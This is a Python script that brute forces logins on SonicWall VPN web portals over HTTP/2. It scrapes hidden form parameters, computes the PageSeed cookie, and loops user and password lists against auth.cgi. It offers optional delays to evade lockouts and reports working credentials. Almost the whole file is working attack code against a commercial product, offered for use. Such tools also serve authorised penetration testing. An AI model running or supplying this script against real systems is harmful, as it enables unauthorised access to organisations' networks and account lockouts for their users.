#!/usr/bin/python3

# Script to brute force logins on SonicWall supporting HTTP/2
#
# 6sp33d@pm.me
# @6sp33d
#
#
# Based on:
# https://gist.github.com/vasuman/fa750a6fe57fc8a73aff
# https://github.com/hoodoer/sonicWallBruteForce


import time
import re
from hashlib import md5
from html.parser import HTMLParser
import sys
import argparse
import httpx


class InputFieldParser(HTMLParser):
    def handle_starttag(self, tag, attr_pairs):
        if tag != 'input':
            return

        attr_dict = dict(attr_pairs)

        if not 'name' in attr_dict:
            return
        if not 'value' in attr_dict:
            return

        name  = attr_dict['name']
        value = attr_dict['value']

        if name == 'param2':
            if debug:
                print("Random param: " + value)
            self.param2 = value
        elif name == 'id':
            if debug:
                print("ID: " + value)
            self.rid = value


def bake_cookies(p):
    cookies = {}
    seedString = p.param2 + password
    seedString = seedString.encode('utf-8')
    page_seed = md5(seedString).hexdigest()

    if debug:
        print("PageSeed: " + page_seed)
    
    cookies['PageSeed'] = page_seed
    # Dunno?
    cookies['temp'] = 'temp'
    return cookies




def make_form(p):
    form = {}
    form['param1']  = ''
    form['param2']  = p.param2
    form['id']      = p.rid
    form['select2'] = 'English'
    form['uName']   = user
    form['pass']    = password
    form['digest']  = ''
    return form




# This should be what sets up our class
def req_login_page():
    if proxy is None:
        resp = httpx.Client(http2=True, verify=False)
        response = resp.get(LOGIN_PORTAL)
    else:
        resp = httpx.Client(http2=True, verify=False, proxies=proxies)
        response = resp.get(LOGIN_PORTAL)

    if debug:
    	print("********************************************")
    	print("Parsing login page at: " + LOGIN_PORTAL)
    	print("Login page response: " + str(response.status_code))
    	print("Login page content: " + str(response.text))
    	print("********************************************")

    parser = InputFieldParser()
    parser.feed(response.text)

    return parser





def do_login():
    p = req_login_page()

    cookies = bake_cookies(p)
    form    = make_form(p)

    # Check if we're using a proxy (e.g. Burp)
    if proxy is None:
        login_req = httpx.Client(http2=True, verify=False)
        response = login_req.post(AUTH_PAGE, data = form, cookies = cookies)

    else:
        login_req = httpx.Client(http2=True, verify=False, proxies=proxies)
        response = login_req.post(AUTH_PAGE, data = form, cookies = cookies)

    if response.status_code != 200:
        # Creds didn't work
        return False
    if response.text.find('auth.html') != -1:
        # Creds didn't work
        return False

    # If we're here, the creds worked
    return True





def main():
    parser = argparse.ArgumentParser(description='Sonic Wall brute force script')
    parser.add_argument("-host", help="host to target, e.g 'https://somesonicwall.xyz' (REQUIRED).", required=True)
    parser.add_argument("-userlist", help="user list (REQUIRED).", required=True)
    parser.add_argument("-password", help="password to use (single).")
    parser.add_argument("-passwordlist", help="password list. Seriously consider setting a delay value.")
    parser.add_argument("-proxy", help="HTTP proxy.")
    parser.add_argument("-passdelay", help="how many seconds to wait before moving to next password in list.")
    parser.add_argument("-userdelay", help="how many seconds to wait before moving to next user in list.")
    parser.add_argument("-debug", help="print extra stuffs.", action='store_true')

    args = parser.parse_args()

    global host, userlist, password, passwordlist, proxy, proxies, pass_delay,user_delay, debug

    host         = args.host
    userlist     = args.userlist
    password     = args.password
    passwordlist = args.passwordlist
    proxy        = args.proxy
    pass_delay   = args.passdelay
    user_delay   = args.userdelay
    debug        = args.debug

    print("Sonic Wall brute force script\n")

    print("Host: " + str(host))
    print("userlist: " + str(userlist))
    print("password: " + str(password))
    print("pass_delay: " + str(pass_delay))
    print("user_delay: " + str(user_delay))
    print("passwordlist: " + str(passwordlist))
    print("proxy: " + str(proxy))
    print("debug: " + str(debug))
    print("\n")



    # Setup our proxy. Burp is a lovely choice. 
    if proxy != None:
        proxies = {
        "http://" : proxy,
        "https://" : proxy
        }



    # Setup endpoints to be used
    global LOGIN_PORTAL, AUTH_PAGE, HEARTBEAT, LOGIN_STATUS, DYN_LOGIN_STATUS, LOGOUT
    LOGIN_PORTAL     = host + '/auth1.html'
    AUTH_PAGE        = host + '/auth.cgi'
    HEARTBEAT        = host + '/usrHeartbeat.cgi'
    LOGIN_STATUS     = host + '/loginStatusTop.html'
    DYN_LOGIN_STATUS = host + '/dynLoginStatus.html?1stLoad=yes'
    LOGOUT           = host + '/dynLoggedOut.html?didLogout=yes'


    # Let's read in our user list
    global users
    userfile = open(userlist)
    try:
        users = userfile.readlines()
    finally:
        userfile.close()



    # Let's figure out what we're doing for passwords
    if password is None and passwordlist is None:
        print("You need a password list or a password set (-password or passwordlist). That should be obvious.")
        sys.exit(-1)
    elif password is not None and passwordlist is not None:
        print("You can only use a single password or a passwordlist, not both. Insert another quarter and try again.")
        sys.exit(-1)

    # Ok, only one of our password options are set, perfect
    # if it's just one password, we should be good already.
    # if we're using a password list, we need to read that fun stuff in
    global passwords
    if passwordlist is not None:
        passwordfile = open(passwordlist)
        try:
            passwords = passwordfile.readlines()
        finally:
            passwordfile.close()
    else:
        # It's just one password
        passwords = password.split('\n')


    # Loppity loop loop time. 
    global user
    for password in passwords:
        for user in users:
            user     = user.strip('\n')
            password = password.strip('\n')

            if debug:
                print("Trying (" + user + ":" + password + ")")

            if do_login():
                print("Winner winner chicken dinner (" + user + ":" + password + ")")
                sys.exit(0)
            else:
                print("Invalid credentials")
                print("Failed - (" + user + ":" + password + ")")

            if user_delay is not None:
            # Should we wait between users to avoid lockouts/blocking?
                print("Pausing before next user")
                time.sleep(int(user_delay))
                print("\n")

        # Should we wait between password cycles to avoid lockouts/blocking?
        if pass_delay is not None:
            print("Password loop done, waiting " + str(delay) + " seconds...")
            time.sleep(int(pass_delay))

    print("Done.")


if __name__ == '__main__':
    main()
